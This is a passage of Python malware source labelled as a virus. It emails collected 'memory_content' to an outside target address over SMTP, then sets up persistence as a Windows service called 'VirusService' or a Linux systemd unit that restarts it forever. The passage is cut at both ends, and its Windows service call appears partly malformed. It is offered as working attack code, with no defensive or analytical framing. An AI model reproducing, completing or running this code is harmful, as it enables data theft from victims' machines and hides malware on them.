            server.login(email_user, email_pass)
            server.sendmail(email_user, target_email, msg.as_string())

    send_email(smtp_server, smtp_port, email_user, email_pass, target_email, memory_content)

    # Step 3: Establish persistence
    def create_persistence():
        if os.name == 'nt':  # Windows
            service_name = 'VirusService'
            service_description = 'A persistent service for the virus'
            service_binary_path = sys.executable  # Path to the current script
            ctypes.windll.advapi32.CreateServiceW(
                None,
                service_name,
                service_description,
                0x00000000,
                0x00000010,
                0x00000020,
                0x00000001,
                service_binary_path,
                None,
                0x00000000,
                None,
                None,
                None
            )
        else:  # Linux
            service_name = 'virus'
            service_file = f'/etc/systemd/system/{service_name}.service'
            service_content = f"""
            [Unit]
            Description=Persistent Virus Service
            After=network.target

            [Service]
            ExecStart={sys.executable}
            Restart=always

            [Install]
            WantedBy=multi-user.target
            """
